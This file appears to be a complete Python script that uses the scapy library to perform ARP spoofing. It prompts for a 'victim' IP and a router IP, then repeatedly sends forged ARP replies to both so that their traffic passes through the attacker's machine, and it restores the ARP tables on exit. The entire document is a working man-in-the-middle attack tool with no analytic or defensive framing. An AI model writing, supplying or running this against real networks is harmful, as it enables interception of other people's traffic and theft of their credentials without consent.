from scapy.all import ARP, sr, send
import time

def get_mac(ip):
    ans, unans = sr(ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in ans:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not get MAC for {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac is None or spoof_mac is None:
        print(f"[!] Could not restore ARP for {target_ip} or {spoof_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

try:
    target = input("Enter victim IP: ").strip()
    for dots in [".", ".....", "...", ".."]:
        print(f'\rLoading{dots}', end=" ", flush=True)
        time.sleep(0.5)
    print("\r" + "  " * 30, end=' ')
    print()

    gateway = input("Enter router/gateway IP: ").strip()

    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.\n")
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        time.sleep(3)

except KeyboardInterrupt:
    print("\n[!] Detected Ctrl+C! Restoring ARP tables...")
    restore(target, gateway)
    restore(gateway, target)
    print("[+] Restored successfully. Victim is safe now.")

except Exception as e:
    print(f"[ERROR] {e}")

